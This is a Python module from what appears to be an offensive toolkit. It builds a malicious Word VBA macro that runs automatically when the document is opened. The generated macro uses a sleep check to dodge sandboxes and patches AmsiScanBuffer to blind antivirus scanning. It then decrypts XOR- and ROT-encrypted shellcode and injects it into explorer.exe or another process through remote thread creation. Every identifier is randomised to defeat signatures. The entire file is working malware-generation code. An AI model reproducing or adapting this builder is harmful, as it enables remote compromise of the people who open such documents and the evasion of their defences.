import os
import random
import string
from ..core.utils import console

def xor_rot_encrypt(data, xor_key, rot_shift):
    encrypted = bytearray()
    key_len = len(xor_key)
    for i in range(len(data)):
        val = data[i] ^ xor_key[i % key_len]
        val = (val + rot_shift) % 256
        encrypted.append(val)
    return encrypted

def generate_random_name(length=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def format_vba_chunks(var_name, data, chunk_size=50):
    str_data = [str(b) for b in data]
    lines = []
    for i in range(0, len(str_data), chunk_size):
        chunk = ",".join(str_data[i:i + chunk_size])
        if i == 0:
            lines.append(f'{var_name} = "{chunk}"')
        else:
            lines.append(f'{var_name} = {var_name} & ",{chunk}"')
    return "\n    ".join(lines)

VBA_TEMPLATE = """
#If VBA7 Then
    Private Declare PtrSafe Function {api_sleep} Lib "kernel32" Alias "Sleep" (ByVal mili As Long) As Long
    Private Declare PtrSafe Function {api_enum_mods} Lib "psapi.dll" Alias "EnumProcessModulesEx" (ByVal hProcess As LongPtr, lphModule As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr, ByVal dwFilterFlag As LongPtr) As LongPtr
    Private Declare PtrSafe Function {api_mod_name} Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFileName As String, ByVal nSize As LongPtr) As LongPtr
    Private Declare PtrSafe Function {api_getmod} Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpLibFileName As String) As LongPtr
    Private Declare PtrSafe Function {api_getproc} Lib "kernel32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
    Private Declare PtrSafe Function {api_virtpro} Lib "kernel32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr
    Private Declare PtrSafe Sub {api_patch} Lib "kernel32" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
    Private Declare PtrSafe Function {api_open} Lib "kernel32" Alias "OpenProcess" (ByVal dwDesiredAcess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As LongPtr) As LongPtr
    Private Declare PtrSafe Function {api_alloc} Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal fAllocType As LongPtr, ByVal flProtect As LongPtr) As LongPtr
    Private Declare PtrSafe Function {api_write} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByRef lpBuffer As Any, ByVal nSize As LongPtr, ByRef lpNumberOfBytesWritten As LongPtr) As LongPtr
    Private Declare PtrSafe Function {api_thread} Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadID As Long) As LongPtr
    Private Declare PtrSafe Function {api_enum_procs} Lib "psapi.dll" Alias "EnumProcesses" (lpidProcess As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr) As LongPtr
    Private Declare PtrSafe Function {api_is_wow64} Lib "kernel32" Alias "IsWow64Process" (ByVal hProcess As LongPtr, ByRef Wow64Process As Boolean) As Boolean
    Private Declare PtrSafe Function {api_close} Lib "kernel32" Alias "CloseHandle" (ByVal hObject As LongPtr) As Boolean
#Else
    Private Declare Function {api_sleep} Lib "kernel32" Alias "Sleep" (ByVal mili As Long) As Long
    Private Declare Function {api_enum_mods} Lib "psapi.dll" Alias "EnumProcessModulesEx" (ByVal hProcess As Long, lphModule As Long, ByVal cb As Long, lpcbNeeded As Long, ByVal dwFilterFlag As Long) As Long
    Private Declare Function {api_mod_name} Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As Long, ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
    Private Declare Function {api_getmod} Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpLibFileName As String) As Long
    Private Declare Function {api_getproc} Lib "kernel32" Alias "GetProcAddress" (ByVal hModule As Long, ByVal lpProcName As String) As Long
    Private Declare Function {api_virtpro} Lib "kernel32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As Long, ByVal flNewProcess As Long, lpflOldProtect As Long) As Long
    Private Declare Sub {api_patch} Lib "kernel32" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
    Private Declare Function {api_open} Lib "kernel32" Alias "OpenProcess" (ByVal dwDesiredAcess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
    Private Declare Function {api_alloc} Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal fAllocType As Long, ByVal flProtect As Long) As Long
    Private Declare Function {api_write} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByRef lpBuffer As Any, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
    Private Declare Function {api_thread} Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadID As Long) As Long
    Private Declare Function {api_enum_procs} Lib "psapi.dll" Alias "EnumProcesses" (lpidProcess As Long, ByVal cb As Long, lpcbNeeded As Long) As Long
    Private Declare Function {api_is_wow64} Lib "kernel32" Alias "IsWow64Process" (ByVal hProcess As Long, ByRef Wow64Process As Boolean) As Boolean
    Private Declare Function {api_close} Lib "kernel32" Alias "CloseHandle" (ByVal hObject As Long) As Boolean
#End If

Function {func_decrypt}(ByVal {var_data} As String, ByVal {var_key} As Variant, ByVal {var_rot} As Integer) As Byte()
    Dim {var_res}() As Byte, {var_i} As Long, {var_val} As Integer, {var_split} As Variant
    {var_split} = Split({var_data}, ",")
    ReDim {var_res}(UBound({var_split}))
    For {var_i} = LBound({var_split}) To UBound({var_split})
        {var_val} = CInt({var_split}({var_i})) - {var_rot}
        If {var_val} < 0 Then {var_val} = {var_val} + 256
        {var_res}({var_i}) = CByte({var_val} Xor {var_key}({var_i} Mod (UBound({var_key}) + 1)))
    Next {var_i}
    {func_decrypt} = {var_res}
End Function

Function {func_getpid}(ByVal {var_name} As String) As LongPtr
    Dim {var_wmi} As Object, {var_set} As Object, {var_p} As Object, {var_path} As String
    On Error Resume Next
    ' Building path using Chr(92) for \ to avoid all corruption issues
    {var_path} = "winmgmts:" & Chr(92) & Chr(92) & "." & Chr(92) & "root" & Chr(92) & "CIMV2"
    Set {var_wmi} = GetObject({var_path})
    Set {var_set} = {var_wmi}.ExecQuery("SELECT ProcessID FROM Win32_Process WHERE name = '" & {var_name} & "'")
    For Each {var_p} In {var_set}
        {func_getpid} = {var_p}.ProcessID
    Next {var_p}
End Function

Function {func_amcheck}(ByVal {var_file} As String, ByVal {var_is64} As Boolean) As Boolean
    Dim {var_sz} As String, {var_hmod}(0 To 1023) As LongPtr, {var_cb} As LongPtr, {var_num} As Integer, {var_res} As LongPtr, {var_i} As Integer
    {func_amcheck} = False
    {var_res} = {api_enum_mods}(-1, {var_hmod}(0), 1024, {var_cb}, &H3)
    If {var_is64} Then {var_num} = {var_cb} / 8 Else {var_num} = {var_cb} / 4
    For {var_i} = 0 To {var_num}
        {var_sz} = String$(50, 0)
        {api_mod_name} -1, {var_hmod}({var_i}), {var_sz}, Len({var_sz})
        If Left({var_sz}, 8) = {var_file} Then {func_amcheck} = True: Exit Function
    Next {var_i}
End Function

Sub {func_patch}(ByVal {var_file} As String, ByVal {var_is64} As Boolean)
    Dim {var_lib} As LongPtr, {var_func} As LongPtr, {var_temp} As LongPtr, {var_old} As LongPtr
    {var_lib} = {api_getmod}({var_file})
    {var_func} = {api_getproc}({var_lib}, "Am" & "si" & "Scan" & "Buffer")
    If {var_func} = 0 Then Exit Sub
    {var_temp} = {api_virtpro}(ByVal {var_func}, 8, 64, {var_old})
    If {var_is64} Then
        {api_patch} ByVal ({var_func}), 1, &HB8
        {api_patch} ByVal ({var_func} + 1), 1, &H57
        {api_patch} ByVal ({var_func} + 2), 1, &H0
        {api_patch} ByVal ({var_func} + 3), 1, &H7
        {api_patch} ByVal ({var_func} + 4), 1, &H80
        {api_patch} ByVal ({var_func} + 5), 1, &HC3
    Else
        {api_patch} ByVal ({var_func}), 1, &HB8
        {api_patch} ByVal ({var_func} + 1), 1, &H57
        {api_patch} ByVal ({var_func} + 2), 1, &H0
        {api_patch} ByVal ({var_func} + 3), 1, &H7
        {api_patch} ByVal ({var_func} + 4), 1, &H80
        {api_patch} ByVal ({var_func} + 5), 1, &HC2
        {api_patch} ByVal ({var_func} + 6), 1, &H18
        {api_patch} ByVal ({var_func} + 7), 1, &H0
    End If
    {var_temp} = {api_virtpro}(ByVal {var_func}, 8, {var_old}, {var_old})
End Sub

Function {func_find_wow64}() As LongPtr
    Dim {var_hprocs}(0 To 1023) As LongPtr, {var_cb} As LongPtr, {var_num} As Integer, {var_isw} As Boolean, {var_sz} As String, {var_hmod}(0 To 1023) As LongPtr, {var_hp} As LongPtr, {var_i} As Integer
    {func_find_wow64} = 0
    If {api_enum_procs}({var_hprocs}(0), 1024, {var_cb}) <> 0 Then
        {var_num} = {var_cb} / 4
        For {var_i} = 0 To {var_num}
            If {var_hprocs}({var_i}) <> 0 Then
                {var_hp} = {api_open}(&H43A, 0, {var_hprocs}({var_i}))
                If {var_hp} <> 0 Then
                    If {api_is_wow64}({var_hp}, {var_isw}) Then
                        If {var_isw} Then
                            {api_enum_mods} {var_hp}, {var_hmod}(0), 1024, {var_cb}, &H3
                            {var_sz} = String$(50, 0)
                            {api_mod_name} {var_hp}, {var_hmod}(0), {var_sz}, Len({var_sz})
                            If Left({var_sz}, 11) <> "WINWORD.exe" Then {func_find_wow64} = {var_hp}: Exit Function
                        End If
                    End If
                    {api_close} {var_hp}
                End If
            End If
        Next {var_i}
    End If
End Function

Sub {func_main}()
    Dim {var_t1} As Date, {var_t2} As Date, {var_is64} As Boolean, {var_str} As String, {var_buf} As Variant, {var_sc}() As Byte, {var_h} As LongPtr, {var_addr} As LongPtr, {var_i} As Long, {var_tid} As Long
    Dim {var_raw64} As String, {var_raw86} As String
    {var_t1} = Now: {api_sleep} (4000): {var_t2} = Now
    If DateDiff("s", {var_t1}, {var_t2}) < 3.5 Then Exit Sub
    
    #If Win64 Then
        {var_is64} = True
    #Else
        {var_is64} = False
    #End If
    
    {var_str} = Dir("C:" & Chr(92) & "Windows" & Chr(92) & "System32" & Chr(92) & "a?s?.d*")
    If {func_amcheck}({var_str}, {var_is64}) Then {func_patch} {var_str}, {var_is64}

    If {var_is64} Then
        {chunked_x64}
        {var_sc} = {func_decrypt}({var_raw64}, Array({xor64}), {rot64})
        {var_h} = {api_open}(&H43A, 0, {func_getpid}("explorer.exe"))
    Else
        {chunked_x86}
        {var_sc} = {func_decrypt}({var_raw86}, Array({xor86}), {rot86})
        {var_h} = {func_find_wow64}()
    End If
    
    If {var_h} = 0 Then {var_h} = {api_open}(&H43A, 0, {func_getpid}("WINWORD.exe"))
    
    If {var_h} <> 0 Then
        {var_addr} = {api_alloc}({var_h}, 0, UBound({var_sc}) + 1, &H3000, &H40)
        For {var_i} = LBound({var_sc}) To UBound({var_sc})
            {api_write} {var_h}, {var_addr} + {var_i}, {var_sc}({var_i}), 1, 0
        Next {var_i}
        {api_thread} {var_h}, 0, 0, {var_addr}, 0, 0, {var_tid}
    End If
End Sub

Sub Document_Open(): {func_main}: End Sub
Sub AutoOpen(): {func_main}: End Sub
"""

def generate(shellcode_x64, shellcode_x86, output_dir):
    xor64 = [random.randint(1, 255) for _ in range(16)]
    rot64 = random.randint(1, 100)
    enc64 = xor_rot_encrypt(shellcode_x64, xor64, rot64)
    
    xor86 = [random.randint(1, 255) for _ in range(16)]
    rot86 = random.randint(1, 100)
    enc86 = xor_rot_encrypt(shellcode_x86, xor86, rot86)
    
    var_raw64 = generate_random_name()
    var_raw86 = generate_random_name()
    
    names = {
        "api_sleep": generate_random_name(), "api_enum_mods": generate_random_name(), "api_mod_name": generate_random_name(),
        "api_getmod": generate_random_name(), "api_getproc": generate_random_name(), "api_virtpro": generate_random_name(),
        "api_patch": generate_random_name(), "api_open": generate_random_name(), "api_alloc": generate_random_name(),
        "api_write": generate_random_name(), "api_thread": generate_random_name(), "api_enum_procs": generate_random_name(),
        "api_is_wow64": generate_random_name(), "api_close": generate_random_name(),
        "func_decrypt": generate_random_name(), "func_amcheck": generate_random_name(), "func_patch": generate_random_name(), 
        "func_getpid": generate_random_name(), "func_find_wow64": generate_random_name(), "func_main": generate_random_name(),
        "var_data": generate_random_name(), "var_key": generate_random_name(), "var_rot": generate_random_name(),
        "var_res": generate_random_name(), "var_i": generate_random_name(), "var_val": generate_random_name(),
        "var_split": generate_random_name(), "var_file": generate_random_name(), "var_is64": generate_random_name(),
        "var_sz": generate_random_name(), "var_hmod": generate_random_name(), "var_cb": generate_random_name(),
        "var_num": generate_random_name(), "var_lib": generate_random_name(), "var_func": generate_random_name(),
        "var_temp": generate_random_name(), "var_old": generate_random_name(), 
        "var_name": generate_random_name(), "var_path": generate_random_name(), "var_wmi": generate_random_name(), "var_set": generate_random_name(),
        "var_p": generate_random_name(), "var_hprocs": generate_random_name(), "var_isw": generate_random_name(),
        "var_hp": generate_random_name(), "var_t1": generate_random_name(), "var_t2": generate_random_name(),
        "var_str": generate_random_name(), "var_buf": generate_random_name(), "var_sc": generate_random_name(),
        "var_h": generate_random_name(), "var_addr": generate_random_name(), "var_tid": generate_random_name(),
        "var_raw64": var_raw64, "var_raw86": var_raw86,
        "xor64": ", ".join(map(str, xor64)), "rot64": rot64, "xor86": ", ".join(map(str, xor86)), "rot86": rot86
    }
    
    names["chunked_x64"] = format_vba_chunks(var_raw64, enc64)
    names["chunked_x86"] = format_vba_chunks(var_raw86, enc86)
    
    output = VBA_TEMPLATE.format(**names)
    output_file = os.path.join(output_dir, "advanced_injector.vba")
    with open(output_file, "w") as f: f.write(output)
    
    console.print(f"[bold green][+] Success! Advanced Injector VBA saved to: [bold white]{output_file}[/bold white][/bold green]")
    return output_file
